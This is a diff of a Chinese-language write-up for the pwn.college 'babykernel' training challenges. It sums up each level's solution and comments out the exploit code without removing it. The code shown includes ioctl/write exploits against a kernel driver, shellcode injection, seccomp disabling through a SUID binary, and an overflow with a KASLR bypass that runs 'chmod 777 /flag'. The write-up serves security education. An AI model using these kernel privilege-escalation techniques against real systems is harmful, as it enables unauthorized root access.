@@ -9,8 +9,8 @@ categories:
 
 
 # 前言
-
-每个题的驱动都是跑在qemu虚拟机的，开启题目后需要`vm connect`连上qemu，此时`lsmod`就可以看见安装好的驱动
+- 根据要求只贴前两个的WriteUp，后续只写思路
+- 每个题的驱动都是跑在qemu虚拟机的，开启题目后需要`vm connect`连上qemu，此时`lsmod`就可以看见安装好的驱动
 
 # level1.0
 ```Shell
@@ -33,17 +33,20 @@ echo ccvqignnvespgtyp > /proc/pwncollege | dmesg
 ```
 
 # level3.0
-```Shell
+write写"xpmylzhkfevejscw"
+<!-- ```Shell
 echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag
-```
+``` -->
 
 # level3.1
-```Shell
+同 level3.0
+<!-- ```Shell
 echo gwcifabytyzfdpjo > /proc/pwncollege | cat /flag
-```
+``` -->
 
 # level4.0
-```C
+ioctl传递"emrbpgldsrexybrh"
+<!-- ```C
 #include <stdio.h>
 #include <fcntl.h>
 
@@ -53,10 +56,11 @@ int main() {
     system("/bin/sh");
     return 0;
 }
-```
+``` -->
 
 # level4.1
-```C
+同 level4.0
+<!-- ```C
 #include <stdio.h>
 #include <fcntl.h>
 
@@ -66,10 +70,11 @@ int main() {
     system("/bin/sh");
     return 0;
 }
-```
+``` -->
 
 # level5.0
-```C
+ioctl传递后门函数的地址即可
+<!-- ```C
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -83,10 +88,11 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-```
+``` -->
 
 # level5.1
-```C
+同 level5.0
+<!-- ```C
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -100,10 +106,11 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-```
+``` -->
 
 # level6.0
-```C
+直接传shellcode过去，它会自己执行
+<!-- ```C
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -117,10 +124,12 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-```
+``` -->
 
 # level6.1
-```C
+同 level6.0
+
+<!-- ```C
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -134,11 +143,20 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-```
+``` -->
 
 
 # level7.0
+需要传一个结构体，字段如下：
 ```C
+struct buf{
+  long size;
+  char shellcode[4096];
+  long call_addr;
+};
+```
+传入的shellcode会被复杂都内核开辟的一段可执行地址内，该地址固定，将call_addr设置为该地址就可以跳过去执行shellcode
+<!-- ```C
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -164,10 +182,11 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-```
+``` -->
 
 # level7.1
-```C
+同 level7.0
+<!-- ```C
 #include <stdio.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
@@ -193,19 +212,19 @@ int main() {
   system("/bin/sh");
   return 0;
 }
-```
+``` -->
 
 
 # level8.0
 这个卡了两天0.0，需要注意下面几个点：
 - /proc/challenge只有root用户才有RW权限
-- /challenge下出了babykernel_level8.1.ko还有带SUID的ELF程序babykernel_level8.1
+- /challenge下除了babykernel_level8.1.ko还有带SUID的ELF程序babykernel_level8.1
 - babykernel_level8.1可以执行任意shellcode，但是seccomp禁用了除了write外的所有系统调用；babykernel_level8.1.ko的write可以接收用户空间的shellcode以执行
-- 因为babykernel_level8.1有SUID所有可以读写/proc/challenge
+- 因为babykernel_level8.1有SUID所以可以读写/proc/challenge
 - 思路就是通过babykernel_level8.1向/proc/challenge写入shellcode在内核空间中关闭seccomp，然后在用户空间ORW读取flag
 - 注意通过current_task_struct->thread_info.flags关闭seccomp只能作用于该进程，通过system('/bin/sh')获取的shell是子进程，seccomp仍然生效
 
-```python
+<!-- ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
@@ -259,11 +278,11 @@ io.sendline(sc)
 # io.sendline("cat /flag")
 io.interactive()
 
-```
+``` -->
 
 # level8.1
-
-```python
+同 level8.0
+<!-- ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
@@ -317,8 +336,61 @@ io.sendline(sc)
 # io.sendline("cat /flag")
 io.interactive()
 
-```
+``` -->
 
 # level9.0
 
+可以控制第一个参数call任意函数，run_cmd("chmod 777 /flag")
+<!-- ```C
+#include <stdio.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+
+int main() {
+  int fd = open("/proc/pwncollege", O_WRONLY);
+  char payload[]="/bin/chmod 777 /flag ;;;;;;;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x80\x95\x08\x81\xff\xff\xff\xff";
+  write(fd,payload,264);
+  return 0;
+}
+``` -->
 # level9.1
+
+同 level9.0
+
+
+# level10.0
+和level9一样，但是开启了KASLR，泄露printk地址后计算run_cmd偏移再通过溢出修改printk指针为run_cmd
+<!-- 
+#include <stdio.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <string.h>
+
+void int64_to_bytes(int64_t num, uint8_t *bytes, int byte_count) {
+    for (int i = 0; i < byte_count; i++) {
+        bytes[i] = (num >> (8 * i)) & 0xFF;
+    }
+}
+
+
+int main() {
+  long printk_addr,run_cmd_addr;
+  printk_addr=0xffffffffaf8b6309;
+  run_cmd_addr=printk_addr-0x2CD89;
+  uint8_t bytes[8];
+  int64_to_bytes(run_cmd_addr,bytes,8);
+  int fd = open("/proc/pwncollege", O_WRONLY);
+  char payload[]="/bin/chmod 777 /flag ;;;;;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+  memcpy(payload+256,bytes,8);
+  write(fd,payload,264);
+  return 0;
+}
+ -->
+
+# level10.1
+同 level10.0
+
+# level11.0
+
+# level11.1
